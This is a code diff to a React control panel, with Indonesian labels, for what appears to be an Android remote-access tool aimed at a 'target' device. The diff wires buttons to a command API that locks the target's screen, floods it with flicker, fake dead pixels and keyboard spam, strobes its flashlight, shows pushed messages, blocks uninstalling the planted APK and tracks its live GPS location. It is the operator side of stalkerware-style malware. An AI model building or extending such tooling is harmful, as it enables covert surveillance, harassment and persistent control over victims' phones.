@@ -23,88 +23,58 @@ export default function ControlPanel({
   const [message, setMessage] = useState("");
   const [flashSpeed, setFlashSpeed] = useState(5);
   const [lineColor, setLineColor] = useState<"green" | "pink">("green");
+  const [sending, setSending] = useState(false);
+  const [lastResult, setLastResult] = useState("");
 
-  function toggle(key: string) {
-    setActive((prev) => ({ ...prev, [key]: !prev[key] }));
+  async function sendCommand(type: string, payload: any = {}) {
+    setSending(true);
+    setLastResult("");
+    try {
+      const res = await fetch("/api/commands", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          deviceId: device.id,
+          type,
+          payload,
+        }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        setLastResult(`Perintah "${type}" terkirim`);
+        setActive((prev) => ({ ...prev, [type]: true }));
+      } else {
+        setLastResult("Gagal kirim perintah");
+      }
+    } catch {
+      setLastResult("Error jaringan");
+    } finally {
+      setSending(false);
+      setTimeout(() => setLastResult(""), 3000);
+    }
   }
 
   const features = [
-    {
-      id: "lock",
-      label: "Lock Device",
-      desc: "Kunci layar device target",
-      color: "neon",
-    },
-    {
-      id: "line",
-      label: "Lightsaber Line",
-      desc: "Garis neon horizontal di layar",
-      color: "neon",
-      extra: true,
-    },
-    {
-      id: "deadpixel",
-      label: "Dead Pixel",
-      desc: "Warna layar berganti-ganti cepat",
-      color: "pink",
-    },
-    {
-      id: "flicker",
-      label: "Flicker",
-      desc: "Layar berkedip-kedip",
-      color: "cyan",
-    },
-    {
-      id: "message",
-      label: "Kirim Pesan",
-      desc: "Pesan muncul di tengah layar (15 detik)",
-      color: "neon",
-      extra: true,
-    },
-    {
-      id: "spamkey",
-      label: "Spam Keyboard",
-      desc: "Spam input / key event",
-      color: "pink",
-    },
-    {
-      id: "flashlight",
-      label: "Spam Senter",
-      desc: "Flashlight berkedip (kecepatan bisa diatur)",
-      color: "cyan",
-      extra: true,
-    },
-    {
-      id: "antiuninstall",
-      label: "Anti Uninstall",
-      desc: "Cegah uninstall APK target",
-      color: "pink",
-    },
-    {
-      id: "gps",
-      label: "GPS Real-time",
-      desc: "Lihat lokasi live device",
-      color: "neon",
-    },
+    { id: "lock", label: "Lock Device", desc: "Kunci layar device target" },
+    { id: "line", label: "Lightsaber Line", desc: "Garis neon horizontal di layar", extra: true },
+    { id: "deadpixel", label: "Dead Pixel", desc: "Warna layar berganti-ganti cepat" },
+    { id: "flicker", label: "Flicker", desc: "Layar berkedip-kedip" },
+    { id: "message", label: "Kirim Pesan", desc: "Pesan muncul di tengah layar (15 detik)", extra: true },
+    { id: "spamkey", label: "Spam Keyboard", desc: "Spam input / key event" },
+    { id: "flashlight", label: "Spam Senter", desc: "Flashlight berkedip (kecepatan bisa diatur)", extra: true },
+    { id: "antiuninstall", label: "Anti Uninstall", desc: "Cegah uninstall APK target" },
+    { id: "gps", label: "GPS Real-time", desc: "Lihat lokasi live device" },
   ];
 
   return (
     <div className="space-y-4 pb-4">
-      <button
-        onClick={onBack}
-        className="text-sm text-nexa-neon font-bold flex items-center gap-1"
-      >
+      <button onClick={onBack} className="text-sm text-nexa-neon font-bold flex items-center gap-1">
         ← Kembali
       </button>
 
-      {/* Device info */}
       <div className="neobrutal p-4">
         <div className="flex items-center gap-3">
-          <div
-            className={`w-3 h-3 rounded-full ${
-              device.online ? "bg-nexa-neon animate-pulse" : "bg-zinc-600"
-            }`}
-          />
+          <div className={`w-3 h-3 rounded-full ${device.online ? "bg-nexa-neon animate-pulse" : "bg-zinc-600"}`} />
           <div>
             <div className="font-bold">{device.name}</div>
             <div className="text-xs text-zinc-400">
@@ -114,7 +84,16 @@ export default function ControlPanel({
         </div>
       </div>
 
-      {/* Features list - tersusun ke bawah */}
+      {lastResult && (
+        <motion.div
+          initial={{ opacity: 0, y: -8 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="text-center text-sm font-bold text-nexa-neon bg-nexa-neon/10 py-2 rounded-xl border border-nexa-neon/30"
+        >
+          {lastResult}
+        </motion.div>
+      )}
+
       <div className="space-y-3">
         {features.map((f) => (
           <div key={f.id} className="neobrutal p-4 space-y-3">
@@ -124,19 +103,34 @@ export default function ControlPanel({
                 <div className="text-xs text-zinc-400">{f.desc}</div>
               </div>
               <button
-                onClick={() => toggle(f.id)}
+                disabled={sending}
+                onClick={() => {
+                  if (f.id === "message") return;
+                  if (f.id === "line") {
+                    const next = !active.line;
+                    sendCommand("line", { enabled: next, color: lineColor });
+                    setActive((p) => ({ ...p, line: next }));
+                    return;
+                  }
+                  if (f.id === "flashlight") {
+                    const next = !active.flashlight;
+                    sendCommand("flashlight", { enabled: next, speed: flashSpeed });
+                    setActive((p) => ({ ...p, flashlight: next }));
+                    return;
+                  }
+                  const next = !active[f.id];
+                  sendCommand(f.id, { enabled: next });
+                  setActive((p) => ({ ...p, [f.id]: next }));
+                }}
                 className={`px-4 py-2 rounded-xl border-2 border-black font-bold text-sm transition-all ${
-                  active[f.id]
-                    ? "bg-nexa-neon text-black shadow-neo"
-                    : "bg-zinc-800 text-white"
+                  active[f.id] ? "bg-nexa-neon text-black shadow-neo" : "bg-zinc-800 text-white"
                 }`}
               >
                 {active[f.id] ? "ON" : "OFF"}
               </button>
             </div>
 
-            {/* Extra controls */}
-            {f.id === "line" && active[f.id] && (
+            {f.id === "line" && (
               <div className="flex gap-2">
                 <button
                   onClick={() => setLineColor("green")}
@@ -171,10 +165,12 @@ export default function ControlPanel({
                   rows={2}
                 />
                 <button
+                  disabled={sending || !message.trim()}
                   onClick={() => {
-                    if (message.trim()) toggle("message");
+                    sendCommand("message", { text: message, duration: 15 });
+                    setMessage("");
                   }}
-                  className="w-full py-2.5 rounded-xl bg-nexa-neon text-black font-bold border-2 border-black shadow-neo"
+                  className="w-full py-2.5 rounded-xl bg-nexa-neon text-black font-bold border-2 border-black shadow-neo disabled:opacity-50"
                 >
                   Kirim Pesan
                 </button>
